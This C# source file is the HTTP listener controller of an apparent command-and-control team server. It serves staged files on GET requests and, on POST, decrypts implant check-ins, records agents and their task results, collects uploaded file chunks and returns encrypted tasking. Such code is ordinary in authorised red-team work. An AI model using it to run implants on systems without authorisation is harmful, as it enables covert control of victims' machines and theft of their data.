using ApiModels.Changes;
using ApiModels.Response;
using ApiModels.WebHost;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Http.Extensions;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using TeamServer.Models.File;
using TeamServer.Services;

namespace TeamServer.Models
{
    [Controller]
    public class HttpListenerController : ControllerBase
    {
        private IAgentService _agentService;
        private IFileService _fileService;
        private IListenerService _listenerService;
        private IBinMakerService _binMakerService;
        private ILoggerFactory _loggerFactory;
        private readonly IChangeTrackingService _changeTrackingService;
        private readonly IWebHostService _webHostService;
        private readonly ICryptoService _cryptoService;

        public HttpListenerController(IAgentService agentService,
            IFileService fileService,
            IListenerService listenerService,
            IBinMakerService binMakerService,
            ILoggerFactory loggerFactory,
            IChangeTrackingService changeTrackingService,
            IWebHostService webHostService,
            ICryptoService cryptoService)
        {
            this._agentService=agentService;
            this._fileService = fileService;
            this._listenerService = listenerService;
            this._binMakerService = binMakerService;
            this._loggerFactory = loggerFactory;
            this._changeTrackingService = changeTrackingService;
            this._webHostService = webHostService;
            this._cryptoService = cryptoService;
        }


        private async Task<IActionResult> WebHost(string path)
        {
            Logger.Log($"WebHost request {path}");
            //var logger = _loggerFactory.CreateLogger("WebHost");
            //logger.LogInformation($"{id}");

            var log = new WebHostLog()
            {
                Path = path,
                Date = DateTime.UtcNow,
                UserAgent = this.HttpContext.Request.Headers.ContainsKey("UserAgent") ?  this.HttpContext.Request.Headers["UserAgent"].ToString() : String.Empty,
                Url = this.HttpContext.Request.GetDisplayUrl(),
            };

            try
            {
                var fileContent = _webHostService.GetFile(path);

                if (fileContent == null)
                {
                    //logger.LogError($"NOT FOUND {fileName} from listener {listener.Name}");
                    //Logger.Log($"NOT FOUND {path}");
                    log.StatusCode = 404;
                    this._webHostService.Addlog(log);
                    return this.NotFound();
                }

                //Logger.Log($"GET {path}");

                log.StatusCode = 200;
                this._webHostService.Addlog(log);
                return this.File(fileContent, "application/octet-stream");
            }
            catch (Exception ex)
            {
                Logger.Log($"WebHost Error : {ex}");
                return NotFound("Error");
            }
        }

        public async Task<IActionResult> HandleRequest(string relativeUrl)
        {
            if (HttpContext.Request.Method == "POST")
            {
                return await this.HandleImplant();
            }
            else
            {
                return await this.WebHost(relativeUrl);
            }
        }


        private async Task<ActionResult> HandleImplant()
        {
            //var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.BindPort == this.Request.Host.Port);

            //var agent = this.CheckIn(id, listener);

            string id = null;
            var result = new List<MessageResult>();
            string body;
            using (var sr = new StreamReader(HttpContext.Request.Body))
                body = await sr.ReadToEndAsync();


            string json = null;
            try
            {
                json = _cryptoService.DecryptFromBase64(body);
                
            }
            catch
            {
                Logger.Log($"Error decrypting agent messages.");
                //Decrypt failed
                return NotFound();
            }

            try
            {
                result = JsonConvert.DeserializeObject<List<MessageResult>>(json);
            }
            catch
            {
                Logger.Log($"Error deserializing agent messages.");
                //json in bad format
                return NotFound();
            }
            

            foreach (var messRes in result)
            {
                if (messRes.Header.Path.Count() == 1)
                {
                    id = messRes.Header.Owner;
                    break;
                }
            }

            if(string.IsNullOrEmpty(id))
            {
                //no main agent
                return NotFound();
            }

            var messages = new List<MessageTask>();
            try
            {
                foreach (var messRes in result)
                {
                    var agentId = messRes.Header.Owner;
                    var messAgent = this.CheckIn(messRes.Header.Owner);

                    if (messRes.MetaData != null)
                    {
                        messAgent.Metadata = messRes.MetaData;
                        this._changeTrackingService.TrackChange(ChangingElement.Agent, messAgent.Id);
                    }

                    messAgent.AddTaskResults(messRes.Items);
                    foreach (var res in messRes.Items)
                        this._changeTrackingService.TrackChange(ChangingElement.Result, res.Id);

                    messAgent.RelayId = id;
                    if (messAgent.Path != messRes.Header.Path)
                    {
                        messAgent.Path = messRes.Header.Path;
                        this._changeTrackingService.TrackChange(ChangingElement.Agent, messAgent.Id);
                    }
                    if (messRes.FileChunk != null)
                        _fileService.AddAgentFileChunk(messRes.FileChunk);

                    messAgent.AddProxyResponses(messRes.ProxyMessages);

                    ////Logger.Log($"Saving resulst of {messAgent.Metadata.Id}");
                    _fileService.SaveResults(messAgent, messRes.Items);
                }


                
                foreach (var ag in this._agentService.GetAgentToRelay(id))
                {
                    var mess = ag.GetNextMessage();
                    if (mess != null)
                        messages.Add(mess);
                }
            }
            catch(Exception ex)
            {
                System.Diagnostics.Debug.WriteLine(ex.ToString());
                throw;
            }

            var camelSettings = new JsonSerializerSettings { ContractResolver = new Newtonsoft.Json.Serialization.CamelCasePropertyNamesContractResolver() };
            var ret = JsonConvert.SerializeObject(messages, camelSettings);
            var enc = this._cryptoService.EncryptAsBase64(ret);

            if (enc.Length == 0)
            {
                int i = 0;
            }

            return Ok(enc);
        }

        private Agent CheckIn(string agentId)
        {
            var agent = this._agentService.GetAgent(agentId);

            this._changeTrackingService.TrackChange(ChangingElement.Agent, agentId);

            if (agent == null)
            {
                agent = new Agent(agentId);
                this._agentService.AddAgent(agent);
                var meta = new AgentTask() { Command = "meta", Id = Guid.NewGuid().ToString(), Label = "MetaData", RequestDate = DateTime.UtcNow };
                agent.QueueTask(meta);
                this._changeTrackingService.TrackChange(ChangingElement.Task, meta.Id);
            }

            agent.CheckIn();

            return agent;
        }
    }
}
